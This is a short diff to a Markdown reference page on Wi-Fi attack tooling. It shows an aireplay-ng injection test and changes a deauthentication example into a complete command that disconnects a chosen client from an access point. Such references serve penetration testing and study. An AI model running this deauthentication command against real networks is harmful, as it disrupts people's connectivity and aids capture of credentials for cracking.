@@ -6,8 +6,8 @@
 # Check if injection works for given interface
 sudo aireplay-ng -9 wlan0mon
 
-# Deauthenticate a device connected to an AP
-aireplay-ng -0 10 -a
+# Deauthenticate a client connected to an AP
+sudo aireplay-ng -0 1 -a $BSSID -c $CLIENT wlan0mon
 ```
 ## References
 
